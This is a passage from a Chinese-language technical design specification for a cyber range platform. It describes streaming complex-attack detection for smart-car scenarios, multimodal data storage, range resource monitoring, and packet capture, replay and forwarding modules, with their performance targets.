Storm，实现实时数据处理和复杂事件处理。</p><p>复杂攻击检测流式计算</p><p>系统采用流式计算框架对智能汽车复杂攻击场景进行实时监控和检测。该功能能够支持基于试验场景知识的计算，覆盖车云协同等多种业务场景，确保在多变的攻击环境中保持高效的检测能力。</p><p>高并发流计算设计</p><p>为了处理多试验场景下的并发计算需求，系统将设计高并发流计算架构。每个试验将在独立的计算资源上运行，确保计算任务之间的隔离性，防止资源争抢和数据干扰。</p><p>攻击子图注销机制</p><p>智能汽车攻防演练结束后，系统能够提供一种机制，根据试验状态自动注销相关的攻击子图。这包括清理内存中的数据、更新数据库状态以及释放计算资源。</p><p>实时流式安全事件处理</p><p>系统具备实时接收智能汽车安全事件的能力，并支持在线知识匹配与关联分析。这将利用复杂事件处理技术，结合安全知识库，实现对攻击行为的快速识别和响应。</p><h6 id="技术实现方案"><a href="#技术实现方案" class="headerlink" title="技术实现方案"></a>技术实现方案</h6><p>消息队列与流计算集成</p><p>系统将集成消息队列和流计算框架，以实现高效的数据传输和处理。消息队列将负责在系统各部分之间传递消息，而流计算框架将处理这些消息，执行实时的安全分析。</p><p>安全知识库</p><p>安全知识库将作为系统的核心组件，存储所有攻击模式、漏洞信息和安全事件。知识库采用图数据库来存储复杂的关系数据，并支持快速的图查询。</p><p>并发控制</p><p>系统采用容器化技术，如Docker或Kubernetes，来实现高并发计算任务的隔离和管理。每个容器将运行独立的试验场景，确保系统资源的有效利用。</p><p>安全事件接收与分析</p><p>实时数据流将通过网络传感器、日志收集器等方式接收，然后通过流计算框架进行处理。系统将利用机器学习和模式识别算法，提高安全事件的检测精度。</p><p>本系统设计方案提供了一个全面的智能汽车网络安全监测与攻击检测解决方案。通过集成先进的消息队列、流计算技术和图数据库，系统将能够实时监测并响应智能汽车网络的安全威胁。高并发流计算设计保证了系统在多试验场景下的性能，而实时流式安全事件处理功能能够快速匹配和关联安全事件，提供有效的安全保障。</p><h5 id="方案简介-5"><a href="#方案简介-5" class="headerlink" title="方案简介"></a>方案简介</h5><p>针对低延迟、高吞吐量和实时智能汽车相关复杂攻击检测，采用复杂攻击知识图谱流计算模块进行支撑，用于处理实时安全数据流。智能汽车攻击子图模式管理与注册是根据子图状态以及消息队列的模式注册。</p><p>随着攻击子图的变化与更新，能够实现流计算安全知识的匹配与加载更新。针对实时、持续、不间断、间隔不定的安全事件数据，通过流计算引擎将其接收，并利用知识匹配的方式，对其复杂攻击组成的攻击步骤进行组合分析，从而产生复杂攻击。智能汽车复杂攻击检测场景流式计算模式，将复杂攻击覆盖车云协同业务场景，流计算匹配流程如下图所示，实时流式接收智能汽车安全事件，进行在线知识匹配与关联分析，系统支持高并发流计算，可同时对多个试验进行复杂攻击检测，而不同试验的并发计算任务是相互独立的，复杂攻击的实时计算并发支持100个，且支持12小时内的数据流在线匹配关联分析。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6e0243ce36bb8a3af4fae2a5901cd372.png"></p><p>复杂攻击知识匹配流计算主要特点包括以下：</p><p>(1）实时数据流：复杂攻击知识匹配流计算引擎处理连续不断生成的实时数据流，这些数据流主要来自于融合后的安全事件。</p><p>(2）事件驱动：复杂攻击知识匹配流计算引擎是基于安全事件驱动的，针对立即响应到达的安全事件数据进行处理，若无数据达到则不做处理。</p><p>(3）低延迟：复杂攻击知识匹配流计算引擎具有非常低的处理延迟，通常以毫秒或亚毫秒为单位，这样有利于实时生成复杂攻击结果，并流转到下一环节。</p><p>(4）高吞吐量：复杂攻击知识匹配流计算引擎高吞吐量的处理能力，针对靶场汽车相关应用比如安全竞赛、产品众测或攻防演练，通常应用规模较大，也会产生大量的安全事件数据，因此需要较高处理性能应对这一场景。</p><p>(5）窗口操作：复杂攻击知识匹配流计算引擎使用窗口操作来处理数据，窗口可以根据时间、事件数量或其他标准对数据进行分组和聚合，以便进行更复杂的分析。</p><p>(6）状态管理：复杂攻击知识匹配流计算引擎针对状态信息进行管理和维护，用于在处理数据流时跟踪和聚合信息。</p><p>(7）容错性：复杂攻击知识匹配流计算引擎具备容错性，以确保在系统故障或错误发生时能够继续处理数据流，而不会丢失数据或引发不一致性。</p><p>复杂攻击知识匹配流计算主要包括三大模块元素：复杂攻击知识、复杂攻击场、汽车应用试验。</p><p>针对复杂攻击知识，支持进行模板下载，并基于下载好的模板，进行知识整理和文件上传，用于作为复杂攻击匹配的基础知识。复杂攻击场景主要应用于智能汽车场景、OTA升级场景、车云协同场景等汽车场景。汽车应用试验保证试验之间互相独立计算，并在试验结束后进行相关数据销毁，从而释放对应资源。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d702c15898d2b0dc6d6af4e1e3292f60.png"></p><h3 id="多模态网络仿真数据库模块"><a href="#多模态网络仿真数据库模块" class="headerlink" title="多模态网络仿真数据库模块"></a>多模态网络仿真数据库模块</h3><h4 id="功能实施方案-20"><a href="#功能实施方案-20" class="headerlink" title="功能实施方案"></a><strong>功能实施方案</strong></h4><p>1） 具备元数据关系数据存储能力，该模块支持镜像、实物设备、工具、场景模板等元数据的关系数据存储。模块能够建立并维护不同类型数据之间的关系，确保数据的完整性和一致性。确保用户可以直观地了解模块的功能和效果。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fa3966a363d59a07a7bfd2b082c7b778.png" alt="IMG_256"></p><ol><li>模块支持大文件存储支持，具备文件存储能力，该模块支持镜像大文件存储，同时支持工具、场景模板等文件的存储。为了满足大量数据的需求，模块还支持文件的分布式对象存储，确保数据的可靠性和可扩展性。这些文件将存储在分布式对象存储中，以确保高效的数据访问和管理。</li><li>模块支持多种模态数据存储和查询，具备多模态数据处理能力，该模块能够支持关系数据、文件数据、索引数据、时序数据等多种模态数据的存储和查询。系统采用高效的数据存储架构，确保数据的完整性和可靠性。同时，提供灵活的查询功能，支持快速检索和分析各类数据，满足用户对不同数据模态的查询需求。这种能力使得模块能够应对各种复杂的数据类型，满足用户多样化的数据处理需求。这确保了系统可以处理多种数据类型，以满足不同的应用需求。</li><li>模块支持多模态数据映射与存储管理，具备数据映射与存储能力，该模块可以将各类采集到的多模态数据映射成靶场标准的数据结构，提供物理设备状态、虚拟节点状态和设备状态等时序数据的存储管理。这种映射功能确保了数据的统一性和可比性，提高了数据处理和分析的效率。</li><li>模块支持高可靠存储服务，数据可靠性，该模块支持对试验过程中的配置数据、运行数据、系统配置和资源数据的高可靠存储服务。这种可靠性确保了试验过程的连续性和准确性，提高了试验结果的可靠性。</li><li>模块支持文本日志存储与索引服务，日志数据服务，该模块提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储、快速检索功能。这种服务为用户提供了方便的日志管理和查询工具，有助于快速定位和解决问题。</li><li>模块支持大文件数据存储管理服务，具备大文件处理能力，该模块提供镜像文件、软件工具等大文件数据存储管理服务，支持大文件数据的高并发快速访存。这种能力使得模块能够应对大规模的数据处理需求，提高了数据处理的速度和效率。</li></ol><h4 id="性能实施方案-20"><a href="#性能实施方案-20" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 该模块支持元数据存储数量不少于10万条。这一要求确保了模块能够处理大规模的元数据，满足用户对数据存储的广泛需求。通过提供足够的存储空间，模块能够保证数据的完整性和可靠性。</p><p>2） 该模块支持镜像存储空间不少于20TB。这一要求确保了模块能够容纳大量的镜像文件，满足用户对镜像数据存储的需求。大容量的存储空间保证了镜像数据的完整性和可扩展性。</p><p>3） 该模块支持工具、场景模板等文件存储空间不少于5TB。这种大容量的存储空间能够满足用户对于各种工具和场景模板文件的存储需求，确保数据的可靠性和完整性。通过提供足够的存储空间，模块能够支持大规模的文件处理和高效的数据管理。</p><h4 id="产品功能截图-3"><a href="#产品功能截图-3" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ol><li>支持镜像、实物设备、工具、场景模板等元数据的关系数据存储，提供产品功能截图；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fa3966a363d59a07a7bfd2b082c7b778.png" alt="IMG_256"></p><h4 id="技术实现内容-20"><a href="#技术实现内容-20" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-8"><a href="#方案设计-8" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数设计为，系统支持镜像、实物设备、工具、场景模板等元数据的关系数据存储。支持镜像大文件存储和工具、场景模板文件的存储，采用分布式对象存储。系统支持关系数据、文件数据、索引数据、时序数据等多种模态数据的存储和查询。能够将多模态数据映射成靶场标准数据结构，提供物理设备状态、虚拟节点状态和设备状态等时序数据的存储管理。支持试验过程中的配置数据、运行数据、系统配置和资源数据的高可靠存储服务。提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储和快速检索。支持镜像文件、软件工具等大文件数据存储管理服务，确保大文件数据的高并发快速访存。</p><p>性能参数设计为，系统支持元数据存储数量达10万条，镜像存储空间为20TB，工具、场景模板等文件存储空间为5TB。</p><h6 id="引言-1"><a href="#引言-1" class="headerlink" title="引言"></a>引言</h6><p>随着网络安全实验需求的增加，对于靶场环境中数据的存储与管理提出了更高的要求。本设计方案旨在构建一个高效、可靠的靶场数据存储与管理系统，以支持复杂的网络安全试验场景。该系统将处理包括镜像、实物设备、工具、场景模板等在内的多模态数据，并提供高性能的数据存储、查询和管理服务。</p><h6 id="系统设计要求概述-1"><a href="#系统设计要求概述-1" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h6><p>元数据关系数据存储</p><p>支持镜像、实物设备、工具、场景模板等元数据的关系数据存储。</p><p>大文件存储服务</p><p>支持镜像大文件存储，及工具、场景模板等文件的存储。</p><p>支持文件的分布式对象存储。</p><p>多模态数据存储与查询</p><p>支持关系数据、文件数据、索引数据、时序数据等多种模态数据的存储和查询。</p><p>数据结构映射与时序数据管理</p><p>支持将采集到的多模态数据映射成靶场标准的数据结构。</p><p>提供物理设备状态、虚拟节点状态和设备状态等时序数据的存储管理。</p><p>试验数据高可靠存储服务</p><p>支持对试验过程中的配置数据、运行数据、系统配置和资源数据的高可靠存储服务。</p><p>日志数据存储与检索</p><p>提供持续文本日志的原始数据存储和索引服务。</p><p>支持日志数据的存储、快速检索功能。</p><p>大文件数据存储管理服务</p><p>提供镜像文件、软件工具等大文件数据存储管理服务。</p><p>支持大文件数据的高并发快速访存。</p><h6 id="性能参数-1"><a href="#性能参数-1" class="headerlink" title="性能参数"></a>性能参数</h6><p>元数据存储能力</p><p>系统能够支持元数据存储数量达到10万条。</p><p>镜像存储空间</p><p>系统能够提供20TB的镜像存储空间。</p><p>文件存储空间</p><p>系统能够提供5TB的工具、场景模板等文件存储空间。</p><p>系统设计详述</p><p>元数据关系数据存储设计</p><p>系统采用关系型数据库来存储元数据，如MySQL或PostgreSQL。数据库将设计以存储镜像、实物设备、工具、场景模板等元数据的关系数据，确保数据的一致性和完整性。</p><p>大文件存储服务设计</p><p>对于大文件的存储，系统采用分布式对象存储解决方案，如Amazon S3或Ceph。这些解决方案能够提供可扩展、高可用的存储服务，满足镜像、工具、场景模板等大文件的存储需求。</p><p>多模态数据存储与查询</p><p>系统将集成多种数据库技术，以支持不同模态数据的存储和查询。关系型数据库将用于关系数据，对象存储将用于文件数据，专门的搜索引擎如Elasticsearch将用于索引数据，时间序列数据库如InfluxDB将用于时序数据。</p><p>数据结构映射与时序数据管理</p><p>系统将开发数据映射引擎，将各类采集到的数据映射成靶场标准的数据结构。同时，系统将利用时间序列数据库管理物理设备状态、虚拟节点状态和设备状态等时序数据。</p><p>试验数据存储服务</p><p>系统能够提供一个高可靠性的存储服务，专门用于试验过程中的配置数据、运行数据、系统配置和资源数据。这能够提供试验数据在任何情况下都不会丢失，支持试验的复现和分析。</p><p>日志数据存储与检索</p><p>系统将部署日志管理服务，如Logstash和Elasticsearch，以实现日志数据的存储和快速检索。这能够支持持续的文本日志原始数据存储，并提供实时日志分析能力。</p><p>大文件数据存储管理服务</p><p>系统将设计一种高效的文件访问和管理机制，以支持大文件数据的高并发快速访存。这将涉及到缓存策略、负载均衡和网络优化等技术，以提高大文件数据的访问速度。</p><h6 id="技术实施方案"><a href="#技术实施方案" class="headerlink" title="技术实施方案"></a>技术实施方案</h6><p>数据库集成</p><p>系统将集成多种数据库服务，每种服务针对其擅长处理的数据类型进行优化配置。这包括关系型数据库服务、对象存储服务、搜索引擎服务和时间序列数据库服务。</p><p>数据映射引擎</p><p>数据映射引擎将使用ETL（提取、转换、加载）工具，如Talend或Apache NiFi，来实现数据的转换和标准化。这能够提供不同来源的数据能够被系统正确理解和处理。</p><p>高可靠性存储架构</p><p>系统采用RAID或分布式副本的方式来确保数据的高可用性和耐久性。这将防止硬件故障导致的数据丢失，并保证数据存储服务的连续性。</p><p>日志管理服务部署</p><p>日志管理服务采用成熟的ELK（Elasticsearch, Logstash, Kibana）堆栈，以便于日志的收集、存储、分析和可视化。</p><p>大文件数据访问优化</p><p>对于大文件数据的存储管理，系统采用分布式文件系统和CDN技术，以提高数据的传输效率和访问速度。同时，系统能够实现智能的数据缓存策略，以减少数据访问延迟。</p><p>通过本设计方案，靶场数据存储与管理系统能够提供一个全面的数据处理和管理解决方案，满足网络安全实验的需求。系统能够支持高性能的数据存储、查询和管理服务，处理多模态数据，并确保试验数据的高可靠性。通过实施本方案，靶场环境将能够更高效地进行网络安全试验，并提供丰富的数据支持。</p><h5 id="方案简介-6"><a href="#方案简介-6" class="headerlink" title="方案简介"></a>方案简介</h5><p>在新业务场景和大数据分析等需求的驱动下，多模型数据管理成为近几年成为业界热点。在OLTP领域，自2012年以来相继出现多款多模原生数据库系统（multi-model database system），如OrientDB，ArangoDB等，而Oracle、PG、SQL Server等老牌关系型数据库系统，也陆续增加了对多模型的支持。 对于这种industry-driven的系统和问题， 使用该系统的必要性主要包括两点:一是传统单一的测量方式无法满足当今多样化的研究需求;二是该系统本身具有的一系列功能和优点。</p><p>随着网络功能的多样化,而传统单一的评价用户体验、可用性测试等的方法已无法满足具体的多样化的研究需求。多模态数据库用于网络仿真，可以具有多维度数据整合与分析、可视化数据分析界面、功能强大且易用、模块化设计，满足不同研究需求、应用领域极其广泛，传统方法所不具备的其它优势等。</p><h3 id="靶场信息库模块"><a href="#靶场信息库模块" class="headerlink" title="靶场信息库模块"></a>靶场信息库模块</h3><h4 id="功能实施方案-21"><a href="#功能实施方案-21" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 模块具备靶场人员与设备信息存储与查询功能，靶场信息库模块提供靶场人员、靶场设备信息元数据存储和关系查询功能。通过这一功能，模块能够管理靶场人员和设备的信息，确保数据的完整性和准确性。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/57873fffb7bdb93ab0598635a753e5b8.png"></p><ol><li>模块具备时序数据存储与查询功能，实现服务器状态监控，靶场信息库模块能够提供靶场服务器CPU、内存、磁盘、网络使用状态等时序数据的存储和查询。这种功能使得用户能够实时监控服务器的运行状态，及时发现和解决潜在问题。提供CPU、内存和磁盘、网络使用状态按日期聚合查询功能，方便用户对服务器状态数据进行统计和分析。</li><li>模块具备虚拟交换机状态存储与查询功能，实现虚拟交换机管理，靶场信息库模块需提供靶场虚拟计算服务器内虚拟交换机状态的状态信息存储和查询功能。通过这一功能，用户可以方便地监控和管理虚拟交换机状态，确保虚拟网络的稳定运行。</li></ol><p>4） 模块具备虚拟资源利用情况存储与查询功能，能够实现资源利用监控，靶场信息库模块需提供靶场内虚拟资源利用情况的存储和查询，包括虚拟CPU、内存和硬盘的当前使用和超配信息。通过这一功能，用户可以全面了解虚拟资源的利用情况，优化资源的配置和管理，提高虚拟环境的运行效率。</p><h4 id="性能实施方案-21"><a href="#性能实施方案-21" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 模块能够提供不少于50台靶场服务器状态存储和查询的能力。这种能力确保了模块能够同时管理多台服务器的运行状态数据，满足大规模靶场环境的处理需求。同时，模块支持靶场服务器状态信息最低存储间隔不高于10秒的设置。这种高精度的数据采集和存储能力，使得用户能够实时监控服务器的运行状态，及时发现和解决潜在问题。</p><h4 id="产品功能截图-4"><a href="#产品功能截图-4" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ol><li>提供靶场人员、靶场设备信息元数据存储和关系查询功能，提供产品功能截图；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/57873fffb7bdb93ab0598635a753e5b8.png"></p><p>支持动态实时判定靶场剩余资源，并给出耗尽提示。支持展示靶场中现存的虚拟机、模板、路由器、防火墙等资源等统计信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5ec72a143b5cc840f72232140ab62732.png"></p><p>虚拟交换机状态信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b7e10f08b5356c0ae798b650d6de4190.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6ecbfbcb499ebe2e3faca44c2e37c363.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3c74ae3293ad08e47ae3a2d7fe3db5c2.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/78fcbd64d6a7471a20477c4dbf6a5512.png"></p><p>虚拟资源统计信息查询</p><p>支持通过内置云盘实现仿真场景环境与外部环境的文件安全交换功能，可查看内置云盘的使用及剩余空间信息，可查看云盘中现存文件列表，并对其进行分类筛选、搜索等操作。</p><h4 id="技术实现内容-21"><a href="#技术实现内容-21" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计为，系统提供靶场人员、靶场设备信息元数据存储和关系查询功能。支持靶场服务器CPU、内存、磁盘、网络使用状态等时序数据的存储和查询，包括CPU、内存和磁盘、网络使用状态的日期聚合查询。提供靶场虚拟计算服务器内虚拟交换机状态信息的存储和查询。支持靶场内虚拟资源利用情况的存储和查询，包括虚拟CPU、内存和硬盘的当前使用和超配信息。</p><p>性能参数设计为，系统提供50台靶场服务器状态存储和查询的能力，靶场服务器状态信息最低存储间隔支持不高于10秒设置。</p><h5 id="引言-2"><a href="#引言-2" class="headerlink" title="引言"></a>引言</h5><p>为了提高靶场的运维效率和资源利用率，本方案旨在构建一个靶场数据管理与监控系统。该系统能够实现靶场人员、设备信息元数据的存储与查询，服务器及虚拟资源的时序数据监控，以及高效的状态聚合查询功能。通过该系统，靶场管理者可以快速获取设备状态，优化资源配置，确保靶场的高效运行。</p><h5 id="系统设计要求概述-2"><a href="#系统设计要求概述-2" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h5><p>靶场人员与设备信息元数据存储和查询</p><p>提供靶场人员、靶场设备信息元数据存储和关系查询功能。</p><p>服务器状态时序数据存储和查询</p><p>提供靶场服务器CPU、内存、磁盘、网络使用状态等时序数据存储和查询。</p><p>提供CPU、内存、磁盘、网络使用状态按日期聚合查询功能。</p><p>虚拟交换机状态信息存储和查询</p><p>提供靶场虚拟计算服务器内虚拟交换机状态信息的存储和查询功能。</p><p>虚拟资源利用情况存储和查询</p><p>提供靶场内虚拟资源利用情况的存储和查询，包括虚拟CPU、内存和硬盘的当前使用和超配信息。</p><h5 id="系统设计详述-1"><a href="#系统设计详述-1" class="headerlink" title="系统设计详述"></a>系统设计详述</h5><p>元数据存储与查询功能</p><p>系统采用关系型数据库管理系统（RDBMS），如PostgreSQL或MySQL，来存储靶场人员与设备信息的元数据。数据库将被设计为支持快速关系查询，以便用户能够通过一个简洁的图形界面查询相关信息。</p><p>系统能够提供一个用户界面，用以展示靶场人员与设备的信息，并支持截图功能。该界面将允许用户通过筛选条件进行搜索，并将结果以表格或图形的形式展示。用户可以从界面上直接截图，以便于报告制作或记录保留。</p><p>服务器状态时序数据存储和查询</p><p>系统将集成时序数据库（TSDB），如InfluxDB，来存储服务器的CPU、内存、磁盘和网络使用状态等时序数据。时序数据库优化了时间戳数据的存储和查询，适合处理高频率的数据采集。</p><p>聚合查询功能</p><p>系统能够提供一个聚合查询工具，该工具能够按照日期对服务器的CPU、内存、磁盘和网络使用状态进行分析和查询。这将帮助管理员了解资源的使用趋势，并进行相应的资源调整。</p><p>虚拟交换机状态信息存储和查询</p><p>系统将扩展其数据库模型，以包含虚拟交换机的状态信息存储和查询。这将允许管理员监控和管理虚拟计算环境中的网络流量和配置状态。</p><p>虚拟资源利用情况存储和查询</p><p>系统将能够存储和查询靶场内虚拟资源的利用情况，包括虚拟CPU、内存和硬盘的当前使用和超配信息。这些信息将帮助管理员优化虚拟资源的分配，避免资源浪费。</p><h5 id="技术实现方案-1"><a href="#技术实现方案-1" class="headerlink" title="技术实现方案"></a>技术实现方案</h5><p>数据库架构设计</p><p>关系型数据库：用于存储靶场人员和设备信息的元数据，以及提供关系查询功能。</p><p>时序数据库：用于存储服务器状态的时序数据，并支持高频率的数据写入和时间范围查询。</p><p>用户界面设计</p><p>设计一个直观的用户界面，用于展示和查询靶场数据。</p><p>界面包括实时数据监控、历史数据查询、系统日志和报警系统。</p><p>数据采集和监控</p><p>部署数据采集代理在靶场服务器上，以收集CPU、内存、磁盘和网络使用状态信息。</p><p>采集的数据将以不高于10秒的间隔发送到时序数据库。</p><p>数据安全与备份</p><p>实施数据加密和访问控制，确保数据的安全性。</p><p>定期备份数据库，以防数据丢失。</p><p>性能优化</p><p>优化数据库索引，加快查询速度。</p><p>对时序数据实施数据降采样，以提高存储效率。</p><p>通过本设计方案，靶场数据管理与监控系统将为靶场管理员提供一个全面的数据管理和监控平台。系统能够支持多种数据类型的存储和查询，包括元数据、时序数据和虚拟资源状态。同时，系统将保证高性能和数据安全性，确保靶场的高效和稳定运行。通过这一系统的实现，靶场运维人员将能够更加便捷地管理和监控靶场资源，提升靶场的运维效率。</p><h3 id="试验数据库模块"><a href="#试验数据库模块" class="headerlink" title="试验数据库模块"></a>试验数据库模块</h3><p><strong>性能参数如下：</strong></p><p>1）支持高精准可靠的试验过程流量数据包存储，并发流处理性能2000万个以上，新建流处理性能5万/秒，功能全开启情况下流量存储性能10Gbps，数据包100%进行全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时，可以选择压缩/不压缩，支持数据包加密存储，加密的方法支持选择SM4国密算法加密、AES(128,192,256）对称加密算法，以及CBC、ECB加密格式；存储容量20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应能体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。</p><p>2）支持以10Gbps速率进行转发，支持10Gbps网卡线速回放。</p><h4 id="功能实施方案-22"><a href="#功能实施方案-22" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 采集模块能够提供完整的试验场景配置数据存储功能，包括场景中节点配置信息、节点间连线关系、子网信息、端口信息等。能够支持用户能够快速查询和管理这些配置数据，以确保试验场景的准确性和可维护性。</p><p>2） 模块能够提供虚拟节点状态的时序数据存储和管理，以记录和追踪虚拟节点的状态变化。这有助于监测系统性能、识别问题并进行性能调优。</p><p>3） 采集模块能够提供持续文本日志的原始数据存储和索引服务，以支持日志数据的高效存储和快速检索。这对于追踪系统操作、排查故障和分析安全事件至关重要。</p><p>4） 模块具备试验过程中流量数据的存储、监视和导出功能。通过实时采集和分析流量数据，系统能够监测网络靶场的运行状态和性能表现。同时，系统支持流量数据的回溯和查询，方便用户对试验过程进行深入分析和挖掘。这一功能有助于提高试验的效率和准确性，为后续的网络靶场优化提供有力支持。</p><p>5） 模块支持数据包搜索功能，具备搜索能力，模块支持根据特征数据（ASCII值、16进制、中文、正则表达式）对数据包进行搜索。这种功能为用户提供了灵活的数据包搜索方式，方便用户根据不同需求进行数据包检索和分析。</p><p>6） 模块支持实时流量转发功能，能够实时处理与转发。用户可以根据需求自定义转发规则。试验数据库模块能够将接收的网络流量进行实时转发，并且在数据报文捕获分析的同时，能够根据自定义转发规则，对数据包进行分析转发。这些规则包括BPF、流规则等，将符合规则的流量转发到物理网卡上。转发时，该模块支持增加GRE、VXLAN封装，满足多种网络协议的需求。</p><p>7） 模块具备历史数据报文回放功能，支持回放与仿真，该模块支持将检索查询到的历史数据报文回放到指定的物理网卡上。回放过程不仅支持增加GRE、VXLAN的隧道封装，还可以增加或修改VLAN标识。同时，用户可以设定回放速率，将原始流量按需进行加速或者减速回放。回放速率可配置为包速率或字节速率，满足不同场景的需求。</p><h4 id="性能实施方案-22"><a href="#性能实施方案-22" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 该模块支持高精准可靠的试验过程流量数据包存储，具有并发流处理性能2000万个以上和新建流处理性能不低于5万/秒的能力。在功能全开启情况下，其流量存储性能不低于10Gbps。采用高性能的万兆网卡实现对于大流量采集数据包的获取。高性能CPU和大内存，实现对于实时流量数据的处理、解析。数据包100%进行全包存储（写入机械硬盘）、无截断、无丢包。为了节省存储空间和提高检索效率，该模块还支持数据包压缩存储和加密存储，全流量存储到硬盘时，可以选择压缩/不压缩，以确保数据的安全性和存储空间的有效利用。加密方法可以选择SM4国密算法加密、AES(128,192,256)对称加密算法以及CBC、ECB加密格式。其存储容量20TB。同时，该模块能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应能体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。模块还支持高速流的存储和检索，以确保数据的完整性和可用性。</p><p>2） 模块支持以10Gbps速率进行数据转发，并具备10Gbps的网卡线速的数据回放能力，以满足高速网络环境下的数据处理需求，保证数据流的高效传输。这种高速的转发和回放能力确保了试验数据的实时性和准确性，提高了测试和仿真的效率。</p><h4 id="技术实现内容-22"><a href="#技术实现内容-22" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-9"><a href="#方案设计-9" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数设计为，系统提供试验场景配置数据的存储，包括场景中节点配置信息、节点间连线关系、子网信息、端口信息等，并支持场景配置数据的快速查询。支持虚拟节点状态时序数据的存储管理。提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储和快速检索。支持试验过程中流量数据的存储、监视和导出，支撑试后进行流量回溯和查询。支持根据特征数据（ASCII值、16进制、中文、正则表达式）对数据包进行搜索。支持将接收的网络流量进行实时转发，自定义转发规则，包括BPF、流规则，将符合规则的流量转发到物理网卡上，转发时支持增加GRE、VXLAN封装。支持将检索查询到的历史数据报文回放到指定的物理网卡上，回放过程支持增加GRE、VXLAN的隧道封装，增加、修改VLAN标识，支持设定回放速率，将原始流量按需加速或减速回放，回放速率支持配置包速率或字节速率。</p><p>性能参数设计为，系统支持高精准可靠的试验过程流量数据包存储，其并发流处理性能达2000万个以上，新建流处理性能5万/秒，功能全开启情况下流量存储性能10Gbps，数据包100%全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时可选择压缩/不压缩，支持数据包加密存储，加密方法包括SM4国密算法加密、AES(128,192,256）对称加密算法，以及CBC、ECB加密格式。存储容量为20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。网卡速度（线束）支持以10Gbps速率进行转发，同时具备其回放功能。</p><h6 id="引言-3"><a href="#引言-3" class="headerlink" title="引言"></a>引言</h6><p>在现代网络环境中，对网络流量的管理与分析需求愈发严格。本方案旨在设计一套综合网络流量管理与分析系统，以满足试验场景配置、虚拟节点状态管理、日志存储检索、流量监视导出、特征数据搜索、实时流量转发、历史数据回放等多样化的需求。系统能够提供高精准的流量数据包存储与处理能力，确保试验数据的完整性与安全性。</p><h6 id="系统设计要求概述-3"><a href="#系统设计要求概述-3" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h6><p>试验场景配置数据存储与查询</p><p>提供试验场景配置数据的存储，包括节点配置信息、节点间连线关系、子网信息、端口信息等，并支持快速查询。</p><p>虚拟节点状态时序数据管理</p><p>提供虚拟节点状态时序数据的存储管理。</p><p>文本日志数据存储与检索</p><p>提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储、快速检索功能。</p><p>流量数据存储、监视与导出</p><p>提供试验过程中流量数据的存储、监视和导出功能，支持试后流量回溯和查询。</p><p>特征数据搜索</p><p>支持根据ASCII值、16进制、中文、正则表达式等特征数据对数据包进行搜索。</p><p>实时流量转发</p><p>支持将接收的网络流量进行实时转发，自定义转发规则，支持增加GRE、VXLAN封装。</p><p>历史数据报文回放</p><p>支持将检索查询到的历史数据报文回放到指定的物理网卡上，并支持多种回放配置。</p><h6 id="系统设计详述-2"><a href="#系统设计详述-2" class="headerlink" 